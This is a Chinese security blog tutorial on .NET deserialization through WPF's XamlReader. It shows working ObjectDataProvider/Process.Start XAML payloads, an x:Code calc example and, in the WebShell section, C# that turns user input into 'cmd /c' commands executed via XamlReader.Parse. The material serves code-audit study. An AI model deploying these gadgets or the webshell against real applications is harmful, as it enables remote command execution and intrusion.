---
title: .NET高级代码审计-反序列化 Gadget之详解XAML
slug: Net-advanced-code-audit-detailed-explanation-of-deserialization-gadget-Xaml
description: .NET反序列化漏洞 XmlSerializer核心Gadget：XamlReader
date: 2022-05-29 09:38:47
copyright: Reprint
author: Ivan1ee dotNet安全矩阵
originaltitle: .NET高级代码审计-反序列化 Gadget之详解XAML
originallink: https://mp.weixin.qq.com/s/8fQNU7i6nqB1kHuL_hhUDw
draft: False
cover: https://img1.dotnet9.com/2022/05/5909.png
categories: WPF
---

## 0x01 背景

.NET反序列化漏洞 `XmlSerializer`核心Gadget：`XamlReader`，封装于WPF核心程序集之一PresentationFramework.dll，处于System.Windows.Markup命名空间下，提供了XamlReader和XamlWriter两个公开类，XamlReader类提供的底层Load方法可解析XAML字符流数据实现创建的.NET对象实例，还提供了上层封装方法XamlReader.Parse用于直接解析XAML字符串，XmlSerializer反序列化链路就是基于此方法达成命令执行。既然脱离不了XAML，那么就跟随笔者初步认识一下XAML，学习相关的基本知识。

## 0x02 XAML入门

WPF是用于替代Windows Form来创建Windows客户端的应用程序，和Web项目一样遵从前端布局和后端代码实现分离的原则，Web项目前端通常是HTML，而XAML是用作WPF项目前端界面开发，XAML的全称是 `Extensible Application Markup Language` 基于通用XML语法用于实例化 .NET对象的标记语言。XAML文档中的每个元素都映射为.NET类的一个实例，如根元素`<Window>`表示WPF创建Window对象，另外根元素还有`<Application>`、`<Page>`、`<UserControl>`，事实上`XAML在编译时也会编成C#类`，所以界面对应的.cs文件内的后台代码内要声明 partial 关键字，从而达到在编译的时候UI界面和运行逻辑代码合在一起的状态。如下最基本的XAML代码

```xml
<Window x:Class="WpfApplication1.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:sys="clr-namespace:System;assembly=mscorlib"
        Title="MainWindow" Height="300" Width="300">
    <ListBox>
        <ListBoxItem>
            <sys:String>欢迎关注dotNet安全矩阵</sys:String>
        </ListBoxItem>
    </ListBox>
</Window>
```

上述包含Window元素以及Grid元素，Window元素代表整个窗口，Grid 可以放置所有的控件。总体结构其实是一个窗体对象内嵌套一个Grid对象。x:Class 代表后端的命名空间和类名，这样的好处在于将WPF里的前端XAML和后端实现代码分开维护，xmlns全拼是：XML namespace，即XML命名空间，xmlns后面可以跟一个可选映射前缀 x，两者之间用冒号分割，另外还声明了两个 xmlns 名称空间，如下表

![](https://img1.dotnet9.com/2022/05/5901.png)

上面列表的网址分别是什么意思呢？这里是XAML解析器的硬性约定，`http://schemas.microsoft.com/winfx/2006/xaml/presentation` 表示引入WPF核心程序集 `PresentationFramework`，例如常见的 `System.Windows.Data` 命名空间，`http://schemas.microsoft.com/winfx/2006/xaml`  表示引入另外核心程序集 `System.Xaml`，例如常用的 `Windows.Markup`, 反编译后可见 如图

![](https://img1.dotnet9.com/2022/05/5902.png)

另外还有`xmlns:sys="clr-namespace:System;assembly=mscorlib"` 表示将 `sys` 前缀 映射到.NET基类库`System.String`名称空间，后续用`<sys:String>`获取字符串类型，类似若想引入其他.NET程序集支持的基类，参考如下语法 `xmlns:Prefix="clr-namespace:Namespace;assembly=AssemblyName"`，例如反序列化攻击载荷常用的`Diagnostics.Process`类所在的程序集：`xmlns:c="clr-namespace:System.Diagnostics;assembly=system"`

![](https://img1.dotnet9.com/2022/05/5903.png)

## 0x03 X:指令

笔者创建的项目名`ObjectDataProvider`有一定迷惑性，这里说明下和反序列化用到的ObjectDataProvider类毫无关联，下表是常见的几种 x: 空间指令含义

![](https://img1.dotnet9.com/2022/05/5904.png)

`x:Class` 前面已说过不再赘述，而 `x:Key` 表示检索资源文件中所需元素的键名，`x:Type` 表示CLR提供的数据类型，在XAML里可以认为是引用某个命名空间下的类，`x:Static` 引用后端类里定义的静态字段，`x:Code` 可在XAML里执行C#代码弹出计算器，例如在窗体`Loaded`事件指定触发的方法名为: `Window_Loaded`

```xml
<x:Code>
        <![CDATA[
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            System.Diagnostics.Process.Start("calc");
        }
        ]]>
</x:Code>
```

借用下图笔者把很多概念都画到了图里面，希望帮助读者有更加直观的了解，下图中 `x:Type` 简单的理解就是在XAML中想使用某种数据类型时就得用它，比如从自定义的命名空间`xmlns:process`里调用`Process`类，另外 `xmlns:local="clr-namespace:ObjectDataProvider"` 将本地项目空间名`ObjectDataProvider` 映射到前缀 `xmlns:local`

![](https://img1.dotnet9.com/2022/05/5905.png)

上图中 `x:Type` 简单的理解就是在XAML中想使用某种数据类型时就得用它，比如从自定义的命名空间`xmlns:process`里调用`Process`类，另外 `xmlns:local="clr-namespace:ObjectDataProvider"` 将本地项目空间名`ObjectDataProvider` 映射到前缀 `xmlns:local`

## 0x04 简化载荷

在第12课里已经详细的介绍过资源字典（ResourceDictionary）功能上以键值对的形式存储资源，并且可存储任意类型的对象。默认窗口设计器会创建 Window.Resources标签，笔者添加两个资源项，一个是String类型、一个是Double类型，最后以静态方式读取资源绑定到TextBlock控件

![](https://img1.dotnet9.com/2022/05/5906.png)

当资源太多需要集中存储时就用到 ResourceDictionary，可以单独将各个资源保存在每个文件中，用ResourceDictionary.MergeDictionaries合并到一起使用

```xml
<ResourceDictionary>
    <ResourceDictionary.MergedDictionaries>
        <ResourceDictionary Source="Dic1.xaml"/>
        <ResourceDictionary Source="Dic2.xaml"/>
    </ResourceDictionary.MergedDictionaries>
 </ResourceDictionary>
 ```

如果在顶层容器里没有找到Window.Resources，程序还会继续上升到Application.Resources去寻找资源，所以我们把恶意代码引入到  Application.Resources 也可以被调用运行。结合 XmlSerialize反序列化给出的Payload看一下XAML，是不是感觉容易多了？

```xml
<![CDATA[
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" 
xmlns:b="clr-namespace:System;assembly=mscorlib" 
xmlns:c="clr-namespace:System.Diagnostics;assembly=system">
    <ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start">
        <ObjectDataProvider.MethodParameters>
            <b:String>cmd</b:String>
            <b:String>/c calc</b:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>]]>
```

clr-namespace:System.Diagnostics 程序集是必须的，需要靠它调用Process类启动新进程。但还可以进一步简化，clr-namespace:System 因为不是必须的所以对应的名称空间 xmlns:b可以不用，MethodParameters也就无需再使用`<b:String>`元素，另外`<ResourceDictionary>`也可以用`<Window.Resources>` 或者 `<Application.Resources>` 、`<Grid>`控件去替代，代码如下

```xml
<Grid xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" 
xmlns:c="clr-namespace:System.Diagnostics;assembly=system">
    <Grid.Resources>
        <ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start">
            <ObjectDataProvider.MethodParameters>calc</ObjectDataProvider.MethodParameters>
        </ObjectDataProvider>
    </Grid.Resources>
</Grid>
```

## 0x05 攻击面

### XamlReader.Parse

ysoserial在XmlSerializer反序列化链中使用XamlReader.Parse解析XAML字符串并返回新对象， 转到定义可见有2个方法重载，官方文档有如下注明

>Reads the XAML input in the specified text string and returns an object that corresponds to the root of the specified markup.

![](https://img1.dotnet9.com/2022/05/5907.png)

笔者创建测试用例存储于Dictionary2.xaml 如下代码，`ObjectType="{x:Type TypeName=local:Process }` 可省略TypeName，另外资源检索键名ResourceKey也可以省略，`Source={StaticResource ResourceKey=obj}`

```xml
<Window 
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        mc:Ignorable="d"
        xmlns:local ="clr-namespace:System.Diagnostics;assembly=System"
        Title="MainWindow" Height="450" Width="800">
    <Window.Resources>
        <ObjectDataProvider x:Key="obj" ObjectType="{x:Type local:Process }" MethodName="Start">
            <ObjectDataProvider.MethodParameters>"winver"</ObjectDataProvider.MethodParameters>
        </ObjectDataProvider>
    </Window.Resources>
    <Grid DataContext="{Binding Source={StaticResource obj}}">
        <Button Content="Button" HorizontalAlignment="Left" Margin="300.085,187.924,0,0" VerticalAlignment="Top" Width="139.599" Height="45.517"/>
    </Grid>
</Window>
```

```C#
string xml = File.ReadAllText("../../Dictionary2.xaml");
XamlReader.Parse(xml);
```

上述代码运行后跟踪调用栈，发现调用了多个Load方法，注意到调用了WpfXamlLoader类的Load方法，发现是一个内部实现的类，不能直接在外部所用，只能通过XamlReader.Loader方法去实现调用

![](https://img1.dotnet9.com/2022/05/5908.png)

### XamlReader.LoadAsync

XamlReader类提供了3种Load重载，另外还提供了LoadAsync异步方法，用于在大文件数据传输不影响程序主线程，可直接载入流转换为对象

```C#
//Test:Load
string xml = File.ReadAllText("../../Dictionary2.xaml");
MemoryStream ms = new MemoryStream(System.Text.Encoding.Default.GetBytes(xml));
XamlReader.Load(ms);

//Test:LoadAsync
MemoryStream ms0 = new MemoryStream(System.Text.Encoding.Default.GetBytes(xml));
XamlReader xamlReader = new XamlReader();
xamlReader.LoadAsync(ms0);
```

![](https://img1.dotnet9.com/2022/05/5909.png)

## 0x06 WebShell

为了增强程序的可操作性，笔者改用aspx页面编写风险检查智能助手，同时设计了主机进程、主机信息采集、主机目录文件访问等功能，内部采用Base64编码和解码的解析方式运行，这样的好处在于对URL特殊字符串的处置，启动`Process`类调用`cmd.exe/c winver.ex`e 执行命令，核心代码和页面用户体验界面如下程序

```C#
public static void CodeInject(string input)
{
    string ExecCode = EncodeBase64("utf-8", input);
    StringBuilder strXMAL = new StringBuilder("<ResourceDictionary ");
    strXMAL.Append("xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" ");
    strXMAL.Append("xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" ");
    strXMAL.Append("xmlns:b=\"clr-namespace:System;assembly=mscorlib\" ");
    strXMAL.Append("xmlns:pro =\"clr-namespace:System.Diagnostics;assembly=System\">");
    strXMAL.Append("<ObjectDataProvider x:Key=\"obj\" ObjectType=\"{x:Type pro:Process}\" MethodName=\"Start\">");
    strXMAL.Append("<ObjectDataProvider.MethodParameters>");
    strXMAL.Append("<b:String>cmd</b:String>");
    strXMAL.Append("<b:String>/c "+ DecodeBase64("utf-8",ExecCode) +"</b:String>");
    strXMAL.Append("</ObjectDataProvider.MethodParameters>");
    strXMAL.Append("</ObjectDataProvider>");
    strXMAL.Append("</ResourceDictionary>");
    XamlReader.Parse(strXMAL.ToString());
}
```

![](https://img1.dotnet9.com/2022/05/5910.png)

## 0x07 结语

有关XamlReader类多个命令执行的方法希望未来不会被恶意滥用，好啦本文就介绍到此，文章涉及的PDF和Demo已打包发布在星球，欢迎对.NET安全关注和关心的同学加入我们，在这里能遇到有情有义的小伙伴，大家聚在一起做一件有意义的事。